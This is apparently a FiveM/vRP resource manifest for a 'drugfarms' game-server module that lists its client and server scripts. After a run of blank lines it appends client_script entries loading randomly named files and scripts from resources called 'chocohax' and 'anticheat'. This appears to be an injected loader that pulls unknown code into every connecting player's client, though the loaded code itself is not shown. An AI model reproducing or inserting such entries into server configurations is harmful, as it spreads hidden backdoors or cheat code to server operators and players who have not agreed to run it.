resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

description "vRP drugfarms"

dependency "vrp"

client_scripts{ 
  "Proxy.lua",
  "warehouses.lua",
  "ipls.lua"
}

server_scripts{ 
  "@vrp/lib/utils.lua",
  "server.lua"
}

client_script "dXKYKWpRFBlOIBufyi.lua"







client_script "13277.lua"
client_script '@chocohax/10992.lua'
client_script '@anticheat/54639.lua'